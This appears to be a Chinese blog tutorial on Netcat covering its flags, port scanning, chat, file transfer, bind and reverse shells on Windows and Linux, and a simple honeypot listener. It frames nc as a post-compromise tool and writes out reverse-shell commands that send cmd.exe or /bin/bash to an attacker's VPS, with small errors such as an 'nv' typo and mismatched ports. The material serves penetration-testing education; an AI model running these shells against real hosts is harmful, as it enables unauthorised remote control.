**目录**

[Netcat](#t0)

[常用参数](#t1)

[常见的用法](#t2)

[端口扫描：](#t3)

[聊天](#t4)

[文件传输](#t5)

[反弹shell](#t6)

[正向连接(目标是windows)](#t7)

[正向连接(目标是Linux)](#t8)

[反向连接(目标是Windows)](#t9)

[反向连接(目标是Linux)](#t10)

[蜜罐](#t11)

* * *

Netcat
======

**Netcat** 常称为 nc，拥有“瑞士军刀”的美誉。nc 小巧强悍，可以读写TCP或UDP网络连接，它被设计成一个可靠的后端工具，能被其它的程序或脚本直接驱动。同时，它又是一个功能丰富的网络调试和开发工具，因为它可以建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能，它基于socket协议工作。在渗透测试领域，我们通常利用它来反弹shell。

**常用参数**
========

*     -l： 开启监听
*     -p：指定端口
*     -t： 以telnet形式应答
*     -e：程序重定向
*     -n：以数字形式表示ip
*     -v：显示执行命令过程
*     -z :  不进行交互，直接显示结果
*     -u ：使用UDP协议传输
*     -w :  设置超时时间

常见的用法
=====

端口扫描：
-----

如果是想单纯的端口扫描的话，利用其它工具比如 nmap会更好。nc端口扫描最主要的用途是，当我们获得了一个网站的权限之后，我们想再渗透进该网站的内网进行渗透。然而，我们的nmap工具是不能扫描到内网的，所以这时我们可以把nc上传到web服务器上，利用它来扫描内网主机。而由于nc体积很小，所以不容易被发现。

```
nc  -z -v -n 192.168.10.14  20-23   #端口或端口范围
```


![](https://img-blog.csdnimg.cn/20181115164108291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果探测到端口开放了，比如上面的 80 端口开放了，我们就可以继续探测其banner信息： 

```
nc -v -n 192.168.10.14  80      
然后输入get
```


![](https://img-blog.csdnimg.cn/20181115164358199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

聊天
--

我们还可以利用 nc 做一个简易版本的聊天工具，通过一边监听端口，一边发送消息去该端口，形成一个简易版本的服务端—客户端模型。

**服务器端：**

```
nc   -lvp    8888      #监听8888端口  -l 监听 -v 显示详细信息  -p 指定端口
```


**客户端：**

```
nc  -nv  10.96.10.208  8888    #连接到服务器的8888端口  -n以数字形式显示ip  -v显示详细信息
```


![](https://img-blog.csdnimg.cn/20181115170537457.png)

文件传输
----

我们可以利用 nc 往客户端传送文件

**服务器端：**

```
nc  -lvp  8888 < test.txt
```


**客户端：**

```
nc -nv 10.96.10.208 8888 > test.txt
```


![](https://img-blog.csdnimg.cn/20181115171306605.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

反弹shell
-------

### 正向连接(目标是windows)

假如我们现在入侵到了一台主机上，我们可以通过执行以下命令将该主机的cmd命令弹到8888端口上

**肉鸡**

```
nc -lvv -p 8888 -t -e cmd.exe
```


然后我们的主机访问该肉鸡的8888端口

**我们的主机**

```
nc  -nvv  192.168.10.14  8888
```


### ![](https://img-blog.csdnimg.cn/20181115172533974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 正向连接(目标是Linux)

目标主机监听8888端口，并反弹bash到8888端口

```
nv -lvp 8888 -t -e /bin/bash
```


我们主动连接目标主机的8888端口

```
nc -nvv 121.201.40.44 8888
```


![](https://img-blog.csdnimg.cn/20200511181651747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 反向连接(目标是Windows)

**我们的主机**

```
nc  -lvp  8888
```


**肉鸡**

```
nc  -t -e cmd.exe 10.96.10.208 8888
```


![](https://img-blog.csdnimg.cn/20181115173348959.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 反向连接(目标是Linux)

我们VPS监听8888端口

```
nc -lvp 8888
```


肉鸡执行如下命令反弹bash到我们的8888端口

```
nc vps地址 2222 -e /bin/bash
```


![](https://img-blog.csdnimg.cn/20200511181328929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

蜜罐
--

作为蜜罐

一直监听8888端口，知道 ctrl+C 停止

```
​​​​​​​nc  -L -p  8888  > log.txt   #监听8888端口，并且将日志信息写入log.txt中
```


![](https://img-blog.csdnimg.cn/20181115190523919.png)